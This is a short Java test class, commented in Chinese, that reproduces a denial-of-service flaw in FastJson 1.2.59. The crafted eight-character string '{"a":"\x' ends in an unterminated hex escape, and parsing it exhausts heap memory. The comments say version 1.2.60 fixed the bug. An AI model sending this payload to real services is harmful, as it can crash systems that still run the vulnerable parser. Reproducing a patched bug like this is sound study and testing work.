package com.jemmy.serialize.leak;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.JSONException;

/**
 * 采用FastJson 1.2.59版本测试
 * -Xmx20m 堆内存设置小些，很快就java.lang.OutOfMemoryError: Java heap space
 *
 * 1.2.60版本修复了此问题，通过抛出异常invalid escape character \x
 * https://blog.csdn.net/u013637451/article/details/100688537
 *
 * @author zhujiang.cheng
 * @since 2020/6/1
 */
public class HexStringAttack {

    public static void main(String[] args) {
        //{"a":"x
        //漏洞是由于fastjson处理字符串中x这种HEX字符表示形式出现的问题。
        //输入字符串长度为8
        final String DANGEROUS_STRING = "{\"a\":\"\\x";
        try{
            Object obj = JSON.parse(DANGEROUS_STRING);
            System.out.println(obj);
        }catch (JSONException ex){
            ex.printStackTrace();
            System.out.println(ex);
        }
    }

}
